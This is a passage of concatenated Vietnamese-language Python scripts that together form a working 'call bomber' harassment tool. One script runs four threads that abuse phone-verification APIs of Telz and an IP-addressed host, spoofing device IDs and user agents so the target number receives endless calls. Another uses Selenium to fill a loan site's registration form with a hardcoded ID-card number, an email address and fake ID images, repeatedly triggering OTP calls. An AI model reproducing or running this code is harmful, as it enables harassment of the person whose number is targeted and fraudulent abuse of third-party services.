                    otp_buttons = driver.find_elements(By.XPATH, "//button[contains(text(), 'qua cuộc gọi')] | //span[contains(text(), 'qua cuộc gọi')]")
                    if otp_buttons:
                        otp_button = otp_buttons[0]
                
                if otp_button:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", otp_button)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", otp_button)
                    print("   ✅ Đã click 'Nhận mã OTP qua cuộc gọi'")
                else:
                    print("   ⚠️ Không tìm thấy nút 'Nhận mã OTP qua cuộc gọi'")
                    
            except Exception as e:
                print(f"   ❌ Lỗi: {e}")
            
            time.sleep(3)
            print(f"\n✅ LOOP {lan} COMPLETED")
            thanh_cong += 1
                
        except Exception as e:
            print(f"❌ ERROR: {e}")
            that_bai += 1
        
        driver.quit()
        
        if lan < SO_LAN_LAP:
            print(f"\n⏳ Waiting 5 seconds...")
            time.sleep(5)
    
    print("\n" + "="*60)
    print(f"📊 SUMMARY: Success {thanh_cong}/{SO_LAN_LAP} | Fail {that_bai}/{SO_LAN_LAP}")
    print("="*60)


# ============================================================
# FILE 2
# ============================================================
import subprocess
import sys
import importlib

required_packages = ['requests', 'aiohttp', 'colorama', 'fake-useragent']

for package in required_packages:
    try:
        if package == 'fake-useragent':
            importlib.import_module('fake_useragent')
        else:
            importlib.import_module(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

import requests, json, time, uuid, threading, asyncio, aiohttp, sys, re, random, os
from threading import Lock, Thread
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
from fake_useragent import UserAgent

init(autoreset=True)

ua = UserAgent()

BASE = "https://api.telz.com/"
GOKU = 300

class RateLimit:
    def __init__(self): 
        self.data, self.lock = {}, Lock()
    def can(self, key):
        with self.lock:
            now = time.time()
            if key in self.data and now - self.data[key] < GOKU: 
                return False
            self.data[key] = now
            return True
            
limiter = RateLimit()

class Telz:
    def __init__(self, aid=None):
        self.aid = aid or uuid.uuid4().hex[:16]
        self.uuid = str(uuid.uuid4())
        self.s = requests.Session()
        random_ua = ua.random
        self.s.headers.update({
            "User-Agent": random_ua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive"
        })
    
    def _post(self, ep, data):
        data.update({
            "android_id": self.aid, 
            "app_version": f"{random.randint(15,20)}.{random.randint(0,9)}.{random.randint(0,99)}",
            "os": "android", 
            "os_version": str(random.randint(10,15)), 
            "ts": int(time.time()*1000), 
            "uuid": self.uuid
        })
        try:
            response = self.s.post(BASE+ep, json=data, timeout=5)
            if response.status_code == 429:
                return {"status": "rate_limit"}
            return response.json()
        except:
            return {"status": "error"}
    
    def call(self, phone):
        if not limiter.can(phone): 
            return {"status": "error", "reason": "Rate limit"}
        try:
            self._post("app/auth_list", {"event": "auth_list"})
            self._post("app/run", {"event": "run", "device_name": f"Pixel-{uuid.uuid4().hex[:6]}"})
            self._post("app/stat_btns", {"event": "stat_btns", "btn": "on_reg_continue"})
            self._post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": phone, "region": "TR"})
            return self._post("app/auth_call", {"event": "auth_call", "phone": phone, "attempt": "0", "lang": "tr"})
        except:
            return {"status": "error"}

def chuan_hoa_so_dien_thoai(so):
    so = re.sub(r'[\s\-\(\)]', '', so)
    if so.startswith('0'):
        so = '+84' + so[1:]
    elif so.startswith('84'):
        so = '+' + so
    elif not so.startswith('+'):
        so = '+84' + so
    return so

async def hemo_call(session, phone):
    random_ua = ua.random
    headers_hemo = {
        'User-Agent': random_ua,
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8",
        'Authorization': "s6abj8F2euaFCk6",
        'Accept': "*/*",
        'Accept-Language': "vi-VN,vi;q=0.9"
    }
    try:
        async with session.post(
            "https://31.171.171.90/api/phone-numbers/auth-flash-call",
            data=json.dumps({"phoneNumber": phone}),
            headers=headers_hemo,
            ssl=False,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as req:
            response_text = await req.text()
            return '{"allow":true}' in response_text
    except:
        return False

def dexron_call(phone):
    try:
        khach_hang = TelzKhachHang(android_id=uuid.uuid4().hex[:16])
        khach_hang.danh_sach_xac_thuc()
        khach_hang.chay()
        khach_hang.thong_ke_nut()
        khach_hang.xac_thuc_so_dien_thoai(phone)
        ket_qua = khach_hang.goi_xac_thuc(phone)
        return bool(ket_qua)
    except:
        return False

class BoGioiHan:
    def __init__(self, gioi_han_giay=300):
        self.gioi_han_giay = float(gioi_han_giay)
        self.cac_yeu_cau = {}
        self.khoa = Lock()
    
    def cho_phep(self, khoa):
        hien_tai = time.time()
        with self.khoa:
            yeu_cau_cu = self.cac_yeu_cau.get(khoa)
            if yeu_cau_cu is None or (hien_tai - yeu_cau_cu) >= self.gioi_han_giay:
                self.cac_yeu_cau[khoa] = hien_tai
                return True
            return False

bo_gioi_han = BoGioiHan(gioi_han_giay=300)

class TelzKhachHang:
    url_goc = "https://api.telz.com/"
    
    def __init__(self, android_id=None, phien_ban_ung_dung="17.5.33", loai_he_dieu_hanh="android", phien_ban_he_dieu_hanh="15"):
        self.android_id = android_id or uuid.uuid4().hex[:16]
        self.phien_ban_ung_dung = phien_ban_ung_dung
        self.loai_he_dieu_hanh = loai_he_dieu_hanh
        self.phien_ban_he_dieu_hanh = phien_ban_he_dieu_hanh
        self.uuid = str(uuid.uuid4())
        self.phien = requests.Session()
        random_ua = ua.random
        self.tieu_de = {
            'User-Agent': random_ua,
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'Accept': "*/*",
            'Accept-Language': "vi-VN,vi;q=0.9",
            'Connection': "keep-alive"
        }
    
    def _gui_post(self, duong_dan, du_lieu, thoi_gian_cho=5.0):
        url = self.url_goc + duong_dan
        du_lieu.update({
            "android_id": self.android_id,
            "app_version": self.phien_ban_ung_dung,
            "os": self.loai_he_dieu_hanh,
            "os_version": self.phien_ban_he_dieu_hanh,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })
        try:
            phan_hoi = self.phien.post(url, data=json.dumps(du_lieu), headers=self.tieu_de, timeout=thoi_gian_cho)
            if phan_hoi.status_code == 429:
                raise RuntimeError("Rate limit")
            phan_hoi.raise_for_status()
            return phan_hoi.json()
        except:
            return {}
    
    def danh_sach_xac_thuc(self):
        return self._gui_post("app/auth_list", {"event": "auth_list"})
    
    def chay(self, ten_thiet_bi=None, ipv4="10.1.10.1", ipv6="FE80::1", ngon_ngu="vi"):
        ten_thiet_bi = ten_thiet_bi or f"Pixel-{uuid.uuid4().hex[:6]}"
        return self._gui_post("app/run", {
            "event": "run",
            "device_name": ten_thiet_bi,
            "ipv4_address": ipv4,
            "ipv6_address": ipv6,
            "lang": ngon_ngu,
            "network_country": "vn",
            "network_type": "4G",
            "roaming": "no",
            "root": "no",
            "run_id": "",
            "sim_country": "vn"
        })
    
    def thong_ke_nut(self, nut="on_reg_continue"):
        return self._gui_post("app/stat_btns", {"event": "stat_btns", "btn": nut})
    
    def xac_thuc_so_dien_thoai(self, so_dien_thoai, vung="VN"):
        return self._gui_post("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": so_dien_thoai, "region": vung})
    
    def goi_xac_thuc(self, so_dien_thoai, lan_thu="0", ngon_ngu="vi"):
        if not bo_gioi_han.cho_phep(so_dien_thoai):
            raise RuntimeError("Rate limit")
        return self._gui_post("app/auth_call", {"event": "auth_call", "phone": so_dien_thoai, "attempt": lan_thu, "lang": ngon_ngu})

def telz_fix_call(phone):
    try:
        android_id = ''.join(random.choices('0123456789abcdef', k=16))
        uuid_str = str(uuid.uuid4())
        imei = ''.join(str(random.randint(0, 9)) for _ in range(15))
        random_ua = ua.random
        
        headers = {
            'User-Agent': random_ua,
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json; charset=UTF-8',
            'X-IMEI': imei,
            'X-Request-ID': str(uuid.uuid4()),
            'Connection': 'close',
            'Cache-Control': 'no-cache'
        }
        
        session = requests.Session()
        
        data = {
            "event": "auth_list",
            "android_id": android_id,
            "app_version": f"{random.randint(15,20)}.{random.randint(0,9)}.{random.randint(0,99)}",
            "os": "android",
            "os_version": str(random.randint(10,14)),
            "ts": int(time.time() * 1000),
            "uuid": uuid_str
        }
        session.post("https://api.telz.com/app/auth_list", json=data, headers=headers, timeout=5)
        
        data["event"] = "run"
        data["device_name"] = f"Android {random.randint(10,14)}"
        data["lang"] = "vi"
        data["network_type"] = "4G"
        data["root"] = "no"
        session.post("https://api.telz.com/app/run", json=data, headers=headers, timeout=5)
        
        data["event"] = "validate_phonenumber"
        data["phone"] = phone
        data["region"] = "VN"
        session.post("https://api.telz.com/app/validate_phonenumber", json=data, headers=headers, timeout=5)
        
        data["event"] = "auth_call"
        data["attempt"] = "0"
        data["lang"] = "vi"
        response = session.post("https://api.telz.com/app/auth_call", json=data, headers=headers, timeout=5)
        return response.status_code == 200
    except:
        return False

class BomberManager:
    def __init__(self, max_calls=0):
        self.running = True
        self.max_calls = max_calls
        self.call_counts = {
            "telz": 0,
            "hemo": 0,
            "dexron": 0,
            "telzfix": 0
        }
        self.stats = {
            "telz": {"sent": 0, "success": 0, "fail": 0},
            "hemo": {"sent": 0, "success": 0, "fail": 0},
            "dexron": {"sent": 0, "success": 0, "fail": 0},
            "telzfix": {"sent": 0, "success": 0, "fail": 0}
        }
        self.lock = Lock()
    
    def can_continue(self, mode):
        with self.lock:
            if self.max_calls == 0:
                return True
            return self.call_counts[mode] < self.max_calls
    
    def increment_count(self, mode):
        with self.lock:
            self.call_counts[mode] += 1
    
    def update_stats(self, mode, success=True):
        with self.lock:
            self.stats[mode]["sent"] += 1
            if success:
                self.stats[mode]["success"] += 1
            else:
                self.stats[mode]["fail"] += 1
    
    def display_stats(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 70)
        print("   ☎️  FOREX CALL BOMBER - 4 CHE DO CHAY CUNG LUC")
        print("=" * 70)
        if self.max_calls > 0:
            print(f"\n🎯 MUC TIEU: {self.max_calls} cuoc goi/mode")
        print(f"\n📊 THONG KE TONG HOP:")
        print(f"  🔴 TELZ BOMBER     : {self.stats['telz']['sent']} lan ({self.call_counts['telz']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print(f"     ✅ Thanh cong: {self.stats['telz']['success']}  ❌ That bai: {self.stats['telz']['fail']}")
        print(f"  🟡 HEMO CALLER     : {self.stats['hemo']['sent']} lan ({self.call_counts['hemo']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print(f"     ✅ Thanh cong: {self.stats['hemo']['success']}  ❌ That bai: {self.stats['hemo']['fail']}")
        print(f"  🟢 DEXRON BOMBER   : {self.stats['dexron']['sent']} lan ({self.call_counts['dexron']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print(f"     ✅ Thanh cong: {self.stats['dexron']['success']}  ❌ That bai: {self.stats['dexron']['fail']}")
        print(f"  🟣 TELZ-FIX BOMBER : {self.stats['telzfix']['sent']} lan ({self.call_counts['telzfix']}/{self.max_calls if self.max_calls>0 else '∞'})")
        print("-" * 70)
        total = sum(self.stats[m]["sent"] for m in self.stats)
        success = sum(self.stats[m]["success"] for m in self.stats)
        print(f"  📈 TONG CONG: {total} cuoc goi | ✅ {success} thanh cong | ❌ {total-success} that bai")
        print(f"  🎯 Ty le thanh cong: {(success/total*100):.1f}%" if total > 0 else "  🎯 0%")
        print("=" * 70)
        print("  ⏱️  Dang chay... Nhan Ctrl+C de dung")

def worker_telz(manager, phone):
    telz = Telz()
    while manager.running and manager.can_continue("telz"):
        try:
            result = telz.call(phone)
            success = result.get("status") == "ok"
            manager.update_stats("telz", success)
            manager.increment_count("telz")
        except:
            manager.update_stats("telz", False)
            manager.increment_count("telz")
        time.sleep(random.uniform(1, 3))

def worker_hemo(manager, phone):
    async def run():
        async with aiohttp.ClientSession() as session:
            while manager.running and manager.can_continue("hemo"):
                try:
                    success = await hemo_call(session, phone)
                    manager.update_stats("hemo", success)
                    manager.increment_count("hemo")
                except:
                    manager.update_stats("hemo", False)
                    manager.increment_count("hemo")
                await asyncio.sleep(random.uniform(1, 3))
    asyncio.run(run())

def worker_dexron(manager, phone):
    while manager.running and manager.can_continue("dexron"):
        try:
            success = dexron_call(phone)
            manager.update_stats("dexron", success)
            manager.increment_count("dexron")
        except:
            manager.update_stats("dexron", False)
            manager.increment_count("dexron")
        time.sleep(random.uniform(1, 3))

def worker_telzfix(manager, phone):
    while manager.running and manager.can_continue("telzfix"):
        try:
            success = telz_fix_call(phone)
            manager.update_stats("telzfix", success)
            manager.increment_count("telzfix")
        except:
            manager.update_stats("telzfix", False)
            manager.increment_count("telzfix")
        time.sleep(random.uniform(1, 3))

def main_2():
    if len(sys.argv) < 2:
        print("=" * 70)
        print("   ☎️  FOREX CALL BOMBER - 4 CHE DO CHAY CUNG LUC")
        print("=" * 70)
        phone = input("📞 Nhap so dien thoai (+84 hoac 0): ").strip()
        max_calls = input("🎯 Nhap so lan goi cho moi mode (0 de chay vo han): ").strip()
        max_calls = int(max_calls) if max_calls.isdigit() else 0
    else:
        phone = sys.argv[1]
        max_calls = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    
    phone = chuan_hoa_so_dien_thoai(phone)
    
    print(f"\n✅ Da chuyen doi sang: {phone}")
    if max_calls > 0:
        print(f"🎯 MOI CHE DO SE GOI {max_calls} LAN")
    else:
        print("🎯 CHE DO VO HAN - CHAY DEN KHI BAN DUNG")
    print("\n⚙️ 4 CHE DO DANG CHAY SONG SONG:")
    print("  🔴 TELZ BOMBER     - Gui lien tuc")
    print("  🟡 HEMO CALLER     - Gui lien tuc")
    print("  🟢 DEXRON BOMBER   - Gui lien tuc")
    print("  🟣 TELZ-FIX BOMBER - Gui lien tuc")
    print("\n🚀 Bat dau tan cong...")
    print("=" * 70)
    
    manager = BomberManager(max_calls=max_calls)
    
    try:
        t1 = Thread(target=worker_telz, args=(manager, phone))
        t1.daemon = True
        t1.start()
        
        t2 = Thread(target=worker_hemo, args=(manager, phone))
        t2.daemon = True
        t2.start()
        
        t3 = Thread(target=worker_dexron, args=(manager, phone))
        t3.daemon = True
        t3.start()
        
        t4 = Thread(target=worker_telzfix, args=(manager, phone))
        t4.daemon = True
        t4.start()
        
        while manager.running:
            manager.display_stats()
            total_counts = sum(manager.call_counts.values())
            if max_calls > 0 and total_counts >= max_calls * 4:
                manager.running = False
                break
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n\n🛑 Dang dung tat ca cac che do...")
        manager.running = False
        time.sleep(1)
        print("✅ Da dung hoan toan!")
        
        print("\n📊 TONG KET CUOI CUNG:")
        total = sum(manager.stats[m]["sent"] for m in manager.stats)
        success = sum(manager.stats[m]["success"] for m in manager.stats)
        fail = total - success
        print(f"  📞 Tong cuoc goi: {total}")
        print(f"  ✅ Thanh cong: {success}")
        print(f"  ❌ That bai: {fail}")
        print(f"  🎯 Ty le: {(success/total*100):.1f}%" if total > 0 else "  🎯 0%")
        print("\n👨‍💻 Da ket thuc!")


# ============================================================
# FILE 3
# ============================================================
import os
import time
import random
import sys
import subprocess

def auto_install_packages():
    packages = ['selenium', 'fake-useragent']
    for package in packages:
        try:
            if package == 'fake-useragent':
                __import__('fake_useragent')
            else:
                __import__(package)
            print(f"✅ {package} đã được cài đặt")
        except ImportError:
            print(f"📦 Đang cài đặt {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"✅ Đã cài đặt {package}")

auto_install_packages()

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.edge.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent

ua = UserAgent()

NGAY_SINH = "30.04.1999"
SO_CCCD = "049234928948"
SO_DT_NGUOI_THAN = "948487344"
SO_DT_TUYEN_DUNG = "912345678"
EMAIL = "huutinh1976743@gmail.com"
HO_TEN = "Nguyễn Văn A"

cac_hang = ["Iphone", "Samsung", "Oppo", "Xiaomi"]

def tao_file_anh_gia(path, kich_thuoc=(800, 600)):
    try:
        with open(path, 'wb') as f:
            f.write(b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00\xFF\xDB\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0A\x0A\x09\x08\x09\x09\x0A\x0C\x0F\x0C\x0A\x0B\x0E\x0B\x09\x09\x0D\x11\x0D\x0E\x0F\x10\x10\x11\x10\x0A\x0C\x12\x13\x12\x10\x13\x0F\x10\x10\x10\xFF\xC0\x00\x0B\x08\x02\x58\x02\x58\x01\x01\x11\x00\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01\x02\x03\x00\x04\x11\x05\x12\x21\x31\x41\x51\x61\x07\x22\x71\x14\x32\x81\x91\xA1\x08\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24\x33\x62\x72\x82\x09\x0A\x16\x17\x18\x19\x1A\x25\x26\x27\x28\x29\x2A\x34\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xC4\x00\x1F\x01\x00\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31\x06\x12\x41\x51\x61\x07\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1\xB1\xC1\x09\x23\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1\x25\xF1\x17\x18\x19\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00')
            for i in range(100):
                f.write(b'\xFF' * 1000)
        print(f"✅ Đã tạo file ảnh giả: {path}")
        return True
    except Exception as e:
        print(f"❌ Lỗi tạo ảnh giả: {e}")
        return False

PATH_ANH_1 = r"C:\Users\Administrator\Downloads\cccd_truoc.jpg"
PATH_ANH_2 = r"C:\Users\Administrator\Downloads\cccd_sau.jpg"
PATH_ANH_3 = r"C:\Users\Administrator\Downloads\chan_dung.jpg"

if not os.path.exists(PATH_ANH_1):
    print("📁 Tạo ảnh giả cho CCCD...")
    temp_dir = os.environ.get('TEMP', r'C:\Users\Administrator\Downloads')
    PATH_ANH_1 = os.path.join(temp_dir, 'cccd_truoc.jpg')
    PATH_ANH_2 = os.path.join(temp_dir, 'cccd_sau.jpg')
    PATH_ANH_3 = os.path.join(temp_dir, 'chan_dung.jpg')
    tao_file_anh_gia(PATH_ANH_1)
    tao_file_anh_gia(PATH_ANH_2)
    tao_file_anh_gia(PATH_ANH_3)

def random_so_tai_khoan():
    so_chu_so = random.choice([8, 9, 10])
    so_tk = ''.join([str(random.randint(0, 9)) for _ in range(so_chu_so)])
    return so_tk, so_chu_so

def kiem_tra_loi_sau_tiep_tuc(driver):
    time.sleep(1.5)
    try:
        loi_element = driver.find_element(By.XPATH, "//*[contains(text(), 'không được để trống') or contains(text(), 'không hợp lệ')]")
        if loi_element.is_displayed():
            return True
    except:
        pass
    return False

def dong_popup(driver):
    try:
        driver.execute_script("""
            var popups = document.querySelectorAll('.modal, .popup, .overlay, [role="dialog"]');
            for(var i=0; i<popups.length; i++) {
                if(popups[i].style.display !== 'none' && popups[i].style.visibility !== 'hidden') {
                    popups[i].style.display = 'none';
                    var closeBtn = popups[i].querySelector('.close, [aria-label="Close"]');
                    if(closeBtn) closeBtn.click();
                }
            }
        """)
        time.sleep(0.5)
        return True
    except:
        return False

def upload_anh_va_otp(driver, lan):
    print("\n" + "="*60)
    print(f"📸 LẦN {lan} - UPLOAD ẢNH CCCD VÀ NHẬN OTP")
    print("="*60)
    
    driver.execute_script("window.scrollTo(0, 0);")
    time.sleep(2)
    
    file_inputs = driver.find_elements(By.XPATH, "//input[@type='file']")
    print(f"📁 Tìm thấy {len(file_inputs)} input file")
    
    anh_paths = [PATH_ANH_1, PATH_ANH_2, PATH_ANH_3]
    for i in range(min(3, len(file_inputs))):
        try:
            if os.path.exists(anh_paths[i]):
                file_inputs[i].send_keys(anh_paths[i])
                print(f"✅ Đã upload ảnh {i+1}: {os.path.basename(anh_paths[i])}")
            else:
                tao_file_anh_gia(anh_paths[i])
                file_inputs[i].send_keys(anh_paths[i])
                print(f"✅ Đã tạo và upload ảnh {i+1}")
            time.sleep(1)
        except Exception as e:
            print(f"❌ Lỗi upload ảnh {i+1}: {e}")
    
    print("\n📱 XÁC THỰC OTP...")
    time.sleep(3)
    
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(2)
    
    clicked = False
    
    cac_tu_tim = ["cuộc gọi", "gọi điện", "call", "voice call"]
    
    for tu in cac_tu_tim:
        if clicked:
            break
        try:
            otp_btn = driver.find_element(By.XPATH, f"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{tu}')]")
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", otp_btn)
            time.sleep(0.5)
            driver.execute_script("arguments[0].click();", otp_btn)
            print(f"📞 Đã ấn nút chứa '{tu}'")
            clicked = True
            break
        except:
            continue
    
    if not clicked:
        try:
            buttons = driver.find_elements(By.TAG_NAME, "button")
            for btn in buttons:
                text_btn = btn.text.lower()
                if ("gọi" in text_btn or "cuộc" in text_btn or "call" in text_btn) and "zalo" not in text_btn:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", btn)
                    print(f"📞 Đã ấn nút cuộc gọi: '{btn.text}'")
                    clicked = True
                    break
        except:
            pass
    
    if not clicked:
        try:
            driver.execute_script("""
                var btns = document.querySelectorAll('button');
                for(var i=0; i<btns.length; i++) {
                    var txt = btns[i].innerText.toLowerCase();
                    if((txt.includes('gọi') || txt.includes('cuộc') || txt.includes('call')) && !txt.includes('zalo')) {
                        btns[i].scrollIntoView({block: 'center'});
                        btns[i].click();
                        return true;
                    }
                }
            """)
            print("📞 Đã click nút cuộc gọi bằng JavaScript")
            clicked = True
        except:
            pass
    
    if not clicked:
        print("❌ KHÔNG TÌM THẤY NÚT CUỘC GỌI!")
    
    print("\n⏳ Chờ 10 giây để OTP được gửi qua cuộc gọi...")
    time.sleep(10)

def click_dang_ky_ngay(driver):
    print("🔍 Đang tìm nút Đăng ký Ngay...")
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "button"))
        )
    except:
        pass
    
    for _ in range(3):
        try:
            driver.execute_script("""
                var popups = document.querySelectorAll('[class*="popup"], [class*="modal"], [class*="overlay"]');
                for(var i=0; i<popups.length; i++) {
                    if(popups[i].style.display !== 'none') {
                        popups[i].style.display = 'none';
                    }
                }
            """)
        except:
            pass
        time.sleep(0.3)
    
    cac_cach_tim = [
        (By.XPATH, "//button[contains(text(), 'Đăng ký')]"),
        (By.XPATH, "//button[contains(text(), 'Đăng Ký')]"),
        (By.XPATH, "//button[contains(text(), 'dang ky')]"),
        (By.XPATH, "//button[contains(@class, 'register')]"),
        (By.XPATH, "//button[contains(@class, 'submit')]"),
        (By.XPATH, "//button[@type='submit']"),
        (By.XPATH, "//div[contains(@class, 'btn')]//button"),
        (By.XPATH, "//*[contains(text(), 'Đăng ký Ngay')]"),
        (By.XPATH, "//*[text()='Đăng ký Ngay']"),
    ]
    
    for by, selector in cac_cach_tim:
        try:
            buttons = driver.find_elements(by, selector)
            for btn in buttons:
                if btn.is_displayed():
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'smooth'});", btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", btn)
                    print(f"✅ Đã nhấn nút Đăng ký: {btn.text if btn.text else selector}")
                    return True
        except:
            continue
    
    try:
        result = driver.execute_script("""
            var btns = document.querySelectorAll('button');
            for(var i=0; i<btns.length; i++) {
                var txt = btns[i].innerText.toLowerCase();
                if(txt.includes('đăng ký') || txt.includes('dang ky')) {
                    btns[i].scrollIntoView({block: 'center'});
                    btns[i].click();
                    return true;
                }
            }
            var divs = document.querySelectorAll('div[role="button"], div.clickable, a');
            for(var i=0; i<divs.length; i++) {
                var txt = divs[i].innerText.toLowerCase();
                if(txt.includes('đăng ký') || txt.includes('dang ky')) {
                    divs[i].scrollIntoView({block: 'center'});
                    divs[i].click();
                    return true;
                }
            }
            return false;
        """)
        if result:
            print("✅ Đã nhấn nút Đăng ký bằng JavaScript")
            return True
    except:
        pass
    
    print("\n🔍 DEBUG: Tất cả button trên trang:")
    buttons = driver.find_elements(By.TAG_NAME, "button")
    for i, btn in enumerate(buttons):
        print(f"   Button {i}: text='{btn.text}', display={btn.is_displayed()}")
    
    print("❌ KHÔNG TÌM THẤY NÚT ĐĂNG KÝ!")
    return False

def thuc_hien_mot_lan(driver, lan, so_dien_thoai):
    print("\n" + "="*60)
    print(f"🔄 LẦN {lan} - BẮT ĐẦU ĐĂNG KÝ")
    print(f"📞 Số điện thoại: {so_dien_thoai}")
    print("="*60)
    
    random_ua = ua.random
    
    dong_popup(driver)
    
    print("\n🏠 TRANG CHỦ")
    driver.get("https://moneycat.loans/")
    time.sleep(5)
    
    dong_popup(driver)
    
    for _ in range(5):
        webdriver.ActionChains(driver).send_keys(Keys.ESCAPE).perform()
        time.sleep(0.3)
    
    dong_popup(driver)
    time.sleep(1)
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "input"))
        )
    except:
        pass
    
    inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📝 Tìm thấy {len(inputs)} input")
    
    if len(inputs) >= 3:
        for i in range(3):
            try:
                if inputs[i].is_displayed() and inputs[i].is_enabled():
                    driver.execute_script("arguments[0].value = '';", inputs[i])
                    time.sleep(0.2)
                else:
                    print(f"⚠️ Input {i+1} không hiển thị hoặc bị disable")
            except:
                print(f"⚠️ Không thể clear input {i+1}")
        
        try:
            inputs[0].send_keys(HO_TEN)
            print(f"✅ Họ tên: {HO_TEN}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[0], HO_TEN)
            print(f"✅ Họ tên (JS): {HO_TEN}")
        
        try:
            inputs[1].send_keys(so_dien_thoai)
            print(f"✅ Số điện thoại: {so_dien_thoai}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[1], so_dien_thoai)
            print(f"✅ Số điện thoại (JS): {so_dien_thoai}")
        
        try:
            inputs[2].send_keys(EMAIL)
            print(f"✅ Email: {EMAIL}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[2], EMAIL)
            print(f"✅ Email (JS): {EMAIL}")
        
        driver.execute_script("document.activeElement?.blur(); document.body.click();")
        time.sleep(1)
    else:
        print(f"❌ Không đủ input (cần 3, có {len(inputs)})")
        return False
    
    print("\n🖱️ ĐANG CLICK NÚT ĐĂNG KÝ NGAY...")
    click_dang_ky_ngay(driver)
    
    print("\n⏳ ĐỢI TRANG CHUYỂN HƯỚNG (TỐI ĐA 20 GIÂY)...")
    
    da_chuyen = False
    for i in range(20):
        time.sleep(1)
        current_url = driver.current_url
        if "reg/personal" in current_url:
            print(f"✅ Đã chuyển sang trang: {current_url}")
            da_chuyen = True
            break
        if "reg" in current_url:
